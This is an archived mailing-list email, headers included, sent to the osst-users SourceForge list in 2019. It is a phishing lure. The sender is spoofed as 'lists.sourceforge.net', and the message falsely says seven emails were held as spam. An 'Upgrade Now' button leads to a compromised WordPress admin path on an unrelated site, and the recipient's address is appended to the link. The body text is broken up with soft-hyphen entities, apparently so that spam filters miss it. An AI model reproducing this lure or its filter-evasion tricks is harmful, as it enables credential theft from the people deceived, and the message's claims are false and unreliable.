Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E31DA32728
	for <lists+osst-users@lfdr.de>; Mon,  3 Jun 2019 06:15:06 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1hXeNF-00039A-JU
	for lists+osst-users@lfdr.de; Mon, 03 Jun 2019 04:15:05 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <noreply@accounts.com>) id 1hXeNE-000393-Km
 for osst-users@lists.sourceforge.net; Mon, 03 Jun 2019 04:15:04 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=lfr7x4zPoRbSUyaxQA9jaRZbodPeUWCLnmIm3bdTAT0=; b=meiMapI0Y7NwddO8A3LFHwh08B
 MvrzDFSdRDJnMnbA5vPwpxg0bQJU8rjmkxBbXZulvY6mwWDCUbeEvF77/dqxISYDN0NmWh38Rm7Gj
 crjJjP41S6HkncSWfrRQ1HmtrG/20MmoUB66jCC3iicdwAQrzn7t4f653+cr/474lFwk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=lfr7x4zPoRbSUyaxQA9jaRZbodPeUWCLnmIm3bdTAT0=; b=E
 8ZknxA3aBQjdqC64WthKskA6XIb+089GQLDVF0VQ2E4HlL+Gx37fcxnW/NCakybA8oVcVaLau2rA4
 DIKoo8RrRDCtI0+qY8a2M5CtWGvdtuvx8TKtoElOck1AeICLl/viKVhF648ZTdG/rm0ct3MXI5SMd
 Osc8q8TZki7WiCg0=;
Received: from mail.nhatkim.com.vn ([203.162.166.97])
 by sfi-mx-4.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 id 1hXeND-002FpE-A6
 for osst-users@lists.sourceforge.net; Mon, 03 Jun 2019 04:15:04 +0000
Received: from localhost (localhost [127.0.0.1])
 by mail.nhatkim.com.vn (Postfix) with ESMTP id 5E6019E8929
 for <osst-users@lists.sourceforge.net>; Mon,  3 Jun 2019 11:14:47 +0700 (ICT)
Received: from mail.nhatkim.com.vn ([127.0.0.1])
 by localhost (mail.nhatkim.com.vn [127.0.0.1]) (amavisd-new, port 10032)
 with ESMTP id NruxA3NfdTTY for <osst-users@lists.sourceforge.net>;
 Mon,  3 Jun 2019 11:14:47 +0700 (ICT)
Received: from localhost (localhost [127.0.0.1])
 by mail.nhatkim.com.vn (Postfix) with ESMTP id 11B669E8D2B
 for <osst-users@lists.sourceforge.net>; Mon,  3 Jun 2019 11:14:47 +0700 (ICT)
X-Virus-Scanned: amavisd-new at nhatkim.com.vn
Received: from mail.nhatkim.com.vn ([127.0.0.1])
 by localhost (mail.nhatkim.com.vn [127.0.0.1]) (amavisd-new, port 10026)
 with ESMTP id ch3fS2mcaZMs for <osst-users@lists.sourceforge.net>;
 Mon,  3 Jun 2019 11:14:46 +0700 (ICT)
Received: from accounts.com (unknown [96.9.249.124])
 by mail.nhatkim.com.vn (Postfix) with ESMTPSA id 216539E8DFE
 for <osst-users@lists.sourceforge.net>; Mon,  3 Jun 2019 11:14:45 +0700 (ICT)
From: lists.sourceforge.net<noreply@accounts.com>
To: osst-users@lists.sourceforge.net
Date: 02 Jun 2019 21:14:44 -0700
Message-ID: <20190602211443.661A6EB1F37E692A@accounts.com>
MIME-Version: 1.0
X-Spam-Score: 7.6 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: candlesontheweb.co.uk]
 1.3 RCVD_IN_RP_RNBL        RBL: Relay in RNBL,
 https://senderscore.org/blacklistlookup/
 [203.162.166.97 listed in bl.score.senderscore.com]
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
 2.4 URI_WPADMIN            WordPress login/admin URI, possible phishing
X-Headers-End: 1hXeND-002FpE-A6
Subject: [Osst-users] lists.sourceforge.net Notification for
 osst-users@lists.sourceforge.net
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3262086491427284327=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============3262086491427284327==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<p><b style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-=
serif; font-size: small;"><font color=3D"#0000ff" size=3D"4">lists.sourcefo=
rge.net Webmail</font></b></p>

<p><span style=3D"color: rgb(255, 0, 0); font-size: large; font-weight: 700=
;">N&shy;o&shy;t&shy;i&shy;f&shy;i&shy;c&shy;at&shy;io&shy;n for:&nbsp;osst=
-users@lists.sourceforge.net</span></p>

<p>lists.sourceforge.net h&shy;a&shy;s&nbsp;p&shy;r&shy;e&shy;v&shy;e&shy;n=
&shy;t&shy;e&shy;d the&nbsp;de&shy;l&shy;iv&shy;er&shy;y&nbsp;of&nbsp;7 n&s=
hy;e&shy;w e&shy;m&shy;ails &shy;t&shy;o y&shy;o&shy;ur i&shy;nb&shy;o&shy;=
x</p>

<p>a&shy;s of 06&nbsp;, 02&nbsp;, 2019 12:00 PM&nbsp;(&shy;U&shy;T&shy;C)&n=
bsp;b&shy;e&shy;c&shy;ause &shy;it &shy;id&shy;en&shy;ti&shy;fi&shy;ed &shy=
;th&shy;es&shy;e &shy;m&shy;es&shy;sa&shy;ge&shy;s &shy;as s&shy;p&shy;a&sh=
y;m.<br />
Y&shy;o&shy;u ca&shy;n Upgrade Now&nbsp;he&shy;re and c&shy;hoo&shy;se&shy;=
 w&shy;ha&shy;t h&shy;ap&shy;pe&shy;n&shy;s t&shy;o t&shy;h&shy;e&shy;m</p>=


<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" he=
ight=3D"45" style=3D"letter-spacing: 0px; background-color: rgb(143, 190, 0=
); margin: 0px; border-spacing: 0px; border-collapse: collapse; font-family=
: Poppins, sans-serif; color: rgb(0, 0, 0); border-radius: 3px;" width=3D"2=
20">
	<tbody>
		<tr>
			<td align=3D"middle" style=3D"font-family: Roboto, RobotoDraft, Helvetic=
a, Arial, sans-serif; margin: 0px; padding: 5px;" valign=3D"center"><a data=
-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.com/ur=
l?q=3Dhttp://www.springspune.com/css/update/index.php?email%3D%5B%5B-Email-=
%5D%5D&amp;source=3Dgmail&amp;ust=3D1558817718963000&amp;usg=3DAFQjCNFi5eQX=
HmNd4aHB38E19LuCaNLx1w" href=3D"https://candlesontheweb.co.uk/blog/wp-admin=
/includes/update?email=3Dosst-users@lists.sourceforge.net%22" rel=3D"norefe=
rrer" style=3D"color: rgb(255, 255, 255); line-height: 26px; font-family: P=
oppins, sans-serif; letter-spacing: 0.02em; font-size: 17px; text-decoratio=
n-line: none;" target=3D"_blank">Upgrade Now</a></td>
		</tr>
	</tbody>
</table>

<p><span class=3D"wdfxihl_t8idu44E"><span class=3D"kpT4oC2_rjmTt">&shy;Powe=
red by: lists.sourceforge.net</span></span></p>

<p>Copyright lists.sourceforge.net</p>

<div>&nbsp;</div>



--===============3262086491427284327==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3262086491427284327==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============3262086491427284327==--
